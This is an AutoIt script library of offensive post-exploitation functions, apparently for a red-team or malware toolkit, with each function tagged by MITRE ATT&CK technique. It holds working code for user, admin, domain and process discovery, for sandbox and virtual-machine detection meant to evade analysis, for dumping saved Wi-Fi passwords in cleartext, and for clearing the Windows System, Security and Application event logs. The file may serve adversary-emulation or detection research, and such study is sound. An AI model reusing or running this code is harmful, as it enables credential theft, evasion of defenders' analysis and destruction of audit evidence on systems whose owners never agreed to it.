#include-once

; OS and environment enumeration via WMI, net commands, and AutoIt builtins

Func GetCurrentUser() ;DESCRIPTION:Return the current username in uppercase;MITRE:Discovery T1033
   Local $sRaw = ExecCommand("whoami")
   Return StringSplit(StringRegExpReplace(StringUpper($sRaw), '\n|\r', ''), "\")[2]
EndFunc

Func IsCurrentUser($sUsername) ;DESCRIPTION:Return True if the process is running as the given username;MITRE:Discovery T1033
   Return StringLower(GetCurrentUser()) == StringLower($sUsername)
EndFunc

Func GetLocalAdmins() ;DESCRIPTION:Return the output of net localgroup administrators;MITRE:Discovery T1069.001
   Return ExecCommand("net localgroup administrators")
EndFunc

Func GetSystemInfo() ;DESCRIPTION:Return full systeminfo output;MITRE:Discovery T1082
   Return ExecCommand("systeminfo")
EndFunc

Func GetInstalledUpdates() ;DESCRIPTION:List all installed Windows updates via WMI;MITRE:Discovery T1082
   Return ExecCommand("wmic qfe list full")
EndFunc

Func GetSharedResources() ;DESCRIPTION:List all shares exposed by the local machine via WMI;MITRE:Discovery T1135
   Return ExecCommand("wmic share get")
EndFunc

Func GetLoginCount($sUser) ;DESCRIPTION:Return the NumberOfLogons value for a given account via WMI;MITRE:Discovery T1033
   Local $sRaw   = ExecCommand("wmic netlogin where (name like '%" & $sUser & "') get numberoflogons")
   Local $aLines = StringSplit($sRaw, @CRLF)
   If $aLines[0] < 4 Then Return 0
   Return StringStripWS($aLines[4], 8)
EndFunc

Func DetectSandboxMouse() ;DESCRIPTION:Return True if mouse moves within 5 s; exit if no movement detected (sandbox check);MITRE:DefenseEvasion T1497.002
   Local $aInitPos = MouseGetPos()
   Local $hTimer   = TimerInit()
   While 1
      If MouseGetPos()[0] <> $aInitPos[0] Then Return True
      If TimerDiff($hTimer) > 5000 Then Exit
   WEnd
EndFunc

Func DetectSandboxSleep() ;DESCRIPTION:Return True if Sleep() runs at real speed — sandboxes often accelerate time to skip delays;MITRE:DefenseEvasion T1497.003
   Local $hTimer = TimerInit()
   Sleep(1000)
   Return TimerDiff($hTimer) >= 500
EndFunc

Func DetectVM() ;DESCRIPTION:Return True if VMware, VirtualBox, or Hyper-V artefacts are found in registry or process list;MITRE:DefenseEvasion T1497.001
   Local $aRegChecks[5][2] = [ _
      ["HKLM\SOFTWARE\VMware, Inc.\VMware Tools",                     "InstallPath"], _
      ["HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",             "Version"],     _
      ["HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters",    "HostName"],    _
      ["HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest",            "ImagePath"],   _
      ["HKLM\SYSTEM\CurrentControlSet\Services\vmhgfs",               "ImagePath"]   _
   ]
   For $i = 0 To UBound($aRegChecks) - 1
      RegRead($aRegChecks[$i][0], $aRegChecks[$i][1])
      If @error = 0 Then Return True
   Next
   Local $sProcs    = ExecCommand("tasklist /fo csv /nh")
   Local $aVmProcs[7] = [ _
      "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", _
      "vboxservice.exe", "vboxtray.exe", _
      "vmicsvc.exe", "qemu-ga.exe" _
   ]
   For $i = 0 To UBound($aVmProcs) - 1
      If StringInStr($sProcs, $aVmProcs[$i]) Then Return True
   Next
   Return False
EndFunc

Func GetRunningProcesses() ;DESCRIPTION:Return full tasklist output;MITRE:Discovery T1057
   Return ExecCommand("tasklist /fo list")
EndFunc

Func GetDomainAdmins() ;DESCRIPTION:Return members of the Domain Admins group;MITRE:Discovery T1069.002
   Return ExecCommand("net group ""Domain Admins"" /domain")
EndFunc

Func GetDomainInfo() ;DESCRIPTION:Return domain trust relationships via nltest;MITRE:Discovery T1482
   Return ExecCommand("nltest /domain_trusts")
EndFunc

Func GetWifiPasswords() ;DESCRIPTION:Return saved WiFi SSIDs and their cleartext keys via netsh;MITRE:CredentialAccess T1552.001
   Local $sBuffer   = ""
   Local $sProfiles = ExecCommand("netsh wlan show profiles")
   Local $aLines    = StringSplit($sProfiles, @CRLF)
   For $i = 1 To $aLines[0]
      If StringInStr($aLines[$i], "All User Profile") Then
         Local $aParts = StringSplit($aLines[$i], ":")
         If $aParts[0] >= 2 Then
            Local $sSsid = StringStripWS($aParts[2], 3)
            If $sSsid <> "" Then
               $sBuffer &= ExecCommand("netsh wlan show profile name=""" & $sSsid & """ key=clear") & @CRLF
            EndIf
         EndIf
      EndIf
   Next
   Return $sBuffer
EndFunc

Func ClearEventLogs() ;DESCRIPTION:Clear System, Security, and Application Windows event logs;MITRE:DefenseEvasion T1070.001
   ExecCommand("wevtutil cl System")
   ExecCommand("wevtutil cl Security")
   ExecCommand("wevtutil cl Application")
EndFunc
